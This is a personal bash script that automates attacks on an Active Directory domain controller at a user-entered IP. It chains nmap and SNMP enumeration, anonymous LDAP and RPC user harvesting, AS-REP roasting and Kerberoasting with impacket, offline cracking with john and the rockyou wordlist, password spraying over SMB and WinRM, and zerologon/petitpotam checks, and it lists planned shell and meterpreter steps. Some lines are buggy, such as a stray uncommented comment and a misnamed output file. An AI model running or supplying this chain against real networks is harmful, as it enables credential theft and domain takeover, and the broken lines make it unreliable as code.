#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
CYAN='\e[96m'
BOLDGREEN="\e[1;${CYAN}"
ENDCOLOR="\e[0m"

echo ""
echo -e "${GREEN} █     █░ ██▓ ███▄    █  ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀     ${ENDCOLOR}"
echo -e "${GREEN}▓█░ █ ░█░▓██▒ ██ ▀█   █ ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒      ${ENDCOLOR}"
echo -e "${GREEN}▒█░ █ ░█ ▒██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░      ${ENDCOLOR}" 
echo -e "${GREEN}░█░ █ ░█ ░██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄      ${ENDCOLOR}" 
echo -e "${GREEN}░░██▒██▓ ░██░▒██░   ▓██░▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄     ${ENDCOLOR}"
echo -e "${GREEN}░ ▓░▒ ▒  ░▓  ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒     ${ENDCOLOR}"
echo -e "${GREEN}  ▒ ░ ░   ▒ ░░ ░░   ░ ▒░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░     ${ENDCOLOR}"
echo -e "${GREEN}  ░   ░   ▒ ░   ░   ░ ░ ░         ░  ░░ ░   ░   ░        ░ ░░ ░      ${ENDCOLOR}"
echo -e "${RED}      ░     ░           ░ ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░        ${ENDCOLOR}"
echo -e "${RED}                          ░                       ░                    ${ENDCOLOR}"


echo -e "${BOLDGREEN} ~ Personnal script for checking activedirectory vulnérabilities  ~${ENDCOLOR}"
echo  -n -e "${BOLDGREEN} ~ Enter ip adress : ${ENDCOLOR}"&read ip


echo  -n -e "${BOLDGREEN} ~ 1- full nmap scan  |  2- basic nmap scan   : ${ENDCOLOR}"&read scan 

if [ "$scan" == 1 ]; then
	mkdir nmap 
	out_nmap=$(sudo nmap -PN -sC -sV -p- -sU $ip > full_nmap)
	mv full_nmap nmap
elif [ "$scan" == 2 ]; then
	mkdir nmap 
	out_nmap=$(sudo nmap -sV -A -sC -Pn $ip > basic_nmap)
	mv basic_nmap nmap
else
	echo -e "${RED} please select 1 or 2 for scan ${ENDCOLOR}"
fi

Uncomment if you want to check snmp

check_snmp=$( cat out_map | grep 161 )
if [ "$check_snmp" ];then
	echo "Potential listing Users [ ... ]"
	snmp_user=$(snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25)
	if [ -n $snmpwalk ];then
		echo $snmp_user > snmp_users.txt
	fi
	echo "Potential enum for process [ ... ]"
	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
fi

## Check for domain part with CME / possibility switch with dnsrecon

domain=$(crackmapexec smb $ip | cut -d: -f3 | cut -d\) -f1   )
if [ "$domain" ];then
	echo -e "${GREEN}[+] Domain found  --> $domain ${ENDCOLOR}"
fi

sudo echo "$ip $domain" >> /etc/hosts

name=$(echo $domain | cut -d. -f1)
ext=$(echo $domain | cut -d. -f2)

## LDAP check for anonymous binding 

ldapsearch -x -H ldap://$ip -b 'DC='$name',DC='$ext'' > ldapsearch
bind_verif=$(cat ldapsearch | grep 'result:' | cut -d: -f2 | cut -d ' ' -f3)
echo $bind_verif
if [ "$bind_verif" = "Success" ];then
	echo -e "${GREEN}[+] Anonymous bind is possible ${ENDCOLOR}"
	ldapsearch -x -H ldap://$ip -b 'DC='$name',DC='$ext''| grep userPrincipalName:  | cut  -d" " -f2 | cut -d@ -f1  > users.txt

	else
		rm ldapsearch
		echo -e "${RED}[-] No succes to bind ldap anonymous  ${ENDCOLOR}"
fi

# Enum4Linux to check RPC enum for discovering some User's

enum4linux $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 >> users.txt 
#enum4linux -a -u"" -p"" $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 >> users.txt 
#enum4linux -a -u"guest" -p"" $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 >> users.txt 
crackmapexec smb $ip --users | grep $domain | cut -d\\ -f2 |cut -d" " -f1 >> users.txt

check_users=$(cat users.txt)

 
if [ -n "$check_users" ];then
	echo -e "${GREEN}[+] Users Found with Eum4linux, trying ASP_REQ_ATTACK${ENDCOLOR}"

	#ASP_REQ_ROAST_CHECK 
	impacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile hash.asproast
	confirm=$(ls | grep hash.asproast)
	if [ "$confirm" = "hash.asproast" ];then
		echo -e "${GREEN}[+] ASP_REQ_ATTACK Found ( check hash ) ... be patient john is cracking the hash  of the user services ${ENDCOLOR}"
		john hash.asproast --wordlist=/usr/share/wordlists/rockyou.txt
	else
		echo -e "${RED}[-] No succes to ASP_REQ_ATTACK  ${ENDCOLOR}"
	fi 

	## Try password spraying 
	echo -e "${GREEN}[+] Users Found with Eum4linux, trying Password SPRAYING ATTACK${ENDCOLOR}"
	passspray=$(crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-succes | grep -E -i + | cut -d: -f1)

	## Kerberoast attack
	if [ -n "$passspray" ];then
		echo -e "${GREEN}[+] Success on password spraying attack with the user $passspray ${ENDCOLOR}"

		echo -e "${BOLDGREEN} TRYING KERBEROAST ATTACK for user $passspray ... ${ENDCOLOR}"

		impacket-GetUserSPNs  -request -dc-ip $ip $domain/$passspray  -outputfile hashes.kerberoast 
		check_kerberoast=$(ls hashes.kerberoast)
		if [ -n "$check_kerberoast" ]; then
				echo -e "${GREEN}[+] User $passspray is kerboastable - trying to crack his password ...${ENDCOLOR}"
				john john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt 
		else
			echo -e "${RED}[-] No succes to KERBEROAST  ${ENDCOLOR}"
		fi
	else
		echo -e "${RED}[-] No succes to Password SPRAYING ATTACK  ${ENDCOLOR}"
	fi

	# Users as pass attack 
	echo -e "${GREEN}[+] Trying Password SPRAYING ATTACK on Another services${ENDCOLOR}"
	crackmapexec smb $ip -u users.txt -p users.txt -M adcs
	crackmapexec winrm $ip -u users.txt -p users.txt --no-bruteforce --continue-on-succes

# else 
# 	echo -e "${RED}[-] Fin ${ENDCOLOR}"
# 	rm users.txt
fi


#CHECKING Possible vuln like zerologon / petitpotam 
crackmapexec smb $ip -u "" -p "" -M zerologon
crackmapexec smb $ip -u "" -p "" -M petitpotam



## Version 2 include attack with shell 

# TODO :

# - all petitpotam attack ( juicy potato, rotten pottato ect .. )
# - Lauch winsh + winpeas
# - switch integrity by foolhelper.exe
# - launch fully meterpreter